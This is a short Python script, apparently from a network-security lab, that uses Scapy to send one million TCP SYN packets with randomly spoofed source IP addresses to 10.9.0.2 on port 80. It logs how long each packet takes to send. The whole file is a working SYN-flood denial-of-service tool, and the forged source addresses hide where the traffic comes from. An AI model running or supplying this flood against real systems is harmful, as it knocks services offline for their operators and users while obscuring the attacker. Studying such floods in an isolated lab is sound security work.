import time
import random
from scapy.all import IP, TCP, send

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def send_syn_packets(target_ip, target_port, count, filename):
    total_time = 0.0

    with open(filename, 'w') as f:
        for i in range(count):
            start_time = time.time()

            # Randomize source IP
            src_ip = random_ip()
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=False)

            end_time = time.time()
            time_taken = end_time - start_time
            total_time += time_taken

            # Write result to the file
            f.write(f"Packet {i + 1}, Time: {time_taken:.6f} seconds\n")
        
        # Write total and average times
        f.write(f"Total time to send all packets: {total_time:.6f} seconds\n")
        f.write(f"Average time per packet: {total_time / count:.6f} seconds\n")

if __name__ == "__main__":
    send_syn_packets("10.9.0.2", 80, 1000000, 'syns_results_p.txt')
